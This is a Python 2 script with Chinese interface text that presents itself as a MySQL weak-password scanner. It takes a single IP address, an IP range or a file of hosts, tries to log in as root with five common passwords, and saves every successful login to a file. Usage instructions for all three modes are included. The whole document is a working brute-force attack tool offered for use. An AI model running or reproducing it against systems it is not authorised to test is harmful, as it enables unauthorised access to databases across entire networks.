#coding=utf-8
import MySQLdb
import sys


userdb=['root','toor','password','123456','123']
users=open('ok.txt','w+')


def ip2num(ip):
    ip=[int(x) for x in ip.split('.')]
    return ip[0] <<24 | ip[1]<<16 | ip[2]<<8 |ip[3]
def num2ip(num):
    return '%s.%s.%s.%s' %( (num & 0xff000000) >>24,
                            (num & 0x00ff0000) >>16,
                            (num & 0x0000ff00) >>8,
                            num & 0x000000ff )
def get_ip(ip):
    start,end = [ip2num(x) for x in ip.split('-') ]
    return [ num2ip(num) for num in range(start,end+1) if num & 0xff ]

def mysqldbs(host,password):
    conn=MySQLdb.connect(host=host,user='root',passwd=password)
    if conn:
        try:
            users.write("[+]IP:"+host+"\t密码:"+password)
            print u"[-]成功[IP:%s\t\t密码:%s]" % (host,password)
            conn.close()
        except:
            pass

def mysqlusers(users):
    userss = get_ip(users)
    for ip in userss:
        for password in userdb:
            try:
                print u"[+]破解中:%s:%s" % (ip.strip(),password)
                mysqldbs(ip,password)
            except:
                pass

def mysqluser(users):
    for password in userdb:
        try:
            print u"[+]破解中:%s:%s" % (users.strip(),password)
            mysqldbs(users,password)
        except:
            pass

def mysqlfile(users):
    for ip in open(users,'r'):
        for password in userdb:
            try:
                print u"[+]破解中:%s:%s" % (ip.strip(),password)
                mysqldbs(ip,password)
            except:
                pass


def main():
    help_l=u"""
                        Mysql弱口令扫描器
                            作者：沦沦
    使用说明：
    单IP扫描：python Mysqlscna.py -u ip
    IP段扫描：python Mysqlscan.py -g 192.168.1.1-192.168.1.255
    批量扫描：python Mysqlscan.py -G ip.txt
    """
    if len(sys.argv)<2:
        print help_l
    else:
        if len(sys.argv)==3:
            if sys.argv[1]=='-u':
                mysqluser(sys.argv[2])
            if sys.argv[1]=='-g':
                mysqlusers(sys.argv[2])
            if sys.argv[1]=='-G':
                mysqlfile(sys.argv[2])

        else:
            print help_l
    

    
if __name__ == '__main__':
    main()
